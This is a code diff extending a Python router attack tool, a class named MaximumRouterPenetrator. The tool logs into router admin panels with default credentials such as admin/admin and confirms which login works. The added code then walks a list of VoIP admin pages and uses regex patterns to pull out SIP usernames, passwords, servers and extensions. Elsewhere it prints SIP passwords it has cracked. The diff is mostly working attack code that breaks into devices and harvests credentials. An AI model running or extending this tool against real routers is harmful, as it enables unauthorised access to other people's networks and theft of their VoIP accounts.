@@ -108,6 +108,10 @@ class MaximumRouterPenetrator:
         self.screenshot_mode = True  # ENABLED for PoC evidence
         self.fast_mode = True        # ENABLED for maximum speed
         
+        # Force screenshot mode to be active
+        if hasattr(self, 'screenshot_config'):
+            self.screenshot_config['enabled'] = True
+        
         # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
             ('admin', 'admin'),
@@ -1002,6 +1006,12 @@ class MaximumRouterPenetrator:
             result['successful_credential'] = auth_result['credentials']
             result['access_method'] = 'verified_credentials'
             
+            # Ensure credential is properly stored
+            if 'credentials' in auth_result:
+                result['working_credential'] = auth_result['credentials']
+                if verbose:
+                    print(f"         ✅ LIVE DEBUG: Working credential confirmed: {auth_result['credentials']}")
+            
             # Take screenshot of admin panel
             if self.screenshot_mode and auth_result.get('session'):
                 try:
@@ -1068,6 +1078,16 @@ class MaximumRouterPenetrator:
                             print(f"         🔓 SIP passwords cracked: {len(cracked_passwords)}")
                             for cracked in cracked_passwords:
                                 print(f"         🔓 {cracked['field']}: {cracked['original']} -> {cracked['decrypted']} ({cracked['method']})")
+            
+            # Enhanced SIP extraction from admin panel
+            if verbose:
+                print(f"         📞 LIVE DEBUG: Searching for VoIP/SIP in admin panel...")
+            
+            sip_result = self._extract_sip_from_admin_panel(target_ip, auth_result, verbose)
+            if sip_result['success']:
+                result['sip_from_admin'] = sip_result['sip_data']
+                if verbose:
+                    print(f"         ✅ SIP data from admin panel: {len(sip_result['sip_data'])} accounts")
             
             total_sip_found = 0
             
@@ -3298,6 +3318,116 @@ class MaximumRouterPenetrator:
                             'field': pattern.split('[')[0],
                             'value': match,
                             'source': 'config_file'
+                        })
+        
+        except Exception:
+            pass
+        
+        return sip_accounts
+    
+    def _extract_sip_from_admin_panel(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
+        """Extract SIP data from admin panel pages"""
+        sip_result = {
+            'success': False,
+            'sip_data': []
+        }
+        
+        try:
+            if verbose:
+                print(f"         🔍 LIVE DEBUG: Searching admin panel for VoIP/SIP...")
+            
+            # Common VoIP/SIP admin panel paths
+            voip_paths = [
+                '/admin/voip.asp', '/admin/voice.asp', '/admin/sip.asp',
+                '/voip.html', '/voice.html', '/sip.html',
+                '/admin/voip_config.asp', '/admin/voice_config.asp',
+                '/admin/voip_settings.asp', '/admin/voice_settings.asp',
+                '/admin/voip_accounts.asp', '/admin/voice_accounts.asp',
+                '/admin/voip_status.asp', '/admin/voice_status.asp',
+                '/admin/voip_log.asp', '/admin/voice_log.asp',
+                '/admin/voip_advanced.asp', '/admin/voice_advanced.asp'
+            ]
+            
+            base_url = f"http://{ip}"
+            credentials = auth_result.get('credentials', ('admin', 'admin'))
+            
+            # Use urllib with Basic Auth
+            import base64
+            auth_string = f'{credentials[0]}:{credentials[1]}'
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            for voip_path in voip_paths:
+                try:
+                    req = urllib.request.Request(f"{base_url}{voip_path}")
+                    req.add_header('Authorization', f'Basic {auth_b64}')
+                    
+                    response = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
+                    content = response.read().decode('utf-8', errors='ignore')
+                    
+                    if response.getcode() == 200 and len(content) > 100:
+                        # Extract SIP data from page content
+                        sip_data = self._extract_sip_from_page_content(content)
+                        if sip_data:
+                            sip_result['sip_data'].extend(sip_data)
+                            if verbose:
+                                print(f"         📞 SIP data found in {voip_path}: {len(sip_data)} accounts")
+                        
+                        if verbose:
+                            print(f"         ✅ VoIP page found: {voip_path} ({len(content)} bytes)")
+                
+                except Exception:
+                    continue
+            
+            if sip_result['sip_data']:
+                sip_result['success'] = True
+                if verbose:
+                    print(f"         ✅ Total SIP accounts from admin panel: {len(sip_result['sip_data'])}")
+            
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ Admin panel SIP extraction error: {str(e)[:50]}")
+        
+        return sip_result
+    
+    def _extract_sip_from_page_content(self, content: str) -> List[Dict[str, str]]:
+        """Extract SIP data from page content"""
+        sip_accounts = []
+        
+        try:
+            # Enhanced SIP patterns for admin panel pages
+            sip_patterns = [
+                r'sip_username["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'sip_password["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'sip_server["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'sip_port["\s]*[:=]["\s]*([0-9]+)',
+                r'voip_username["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'voip_password["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'voip_server["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'phone_number["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'extension["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'username["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'password["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'server["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'port["\s]*[:=]["\s]*([0-9]+)',
+                r'account["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'user["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'pass["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'host["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'domain["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'proxy["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'registrar["\s]*[:=]["\s]*([^"\s\n]+)'
+            ]
+            
+            import re
+            for pattern in sip_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    if match and len(match) > 2:
+                        sip_accounts.append({
+                            'field': pattern.split('[')[0],
+                            'value': match,
+                            'source': 'admin_panel'
                         })
         
         except Exception:
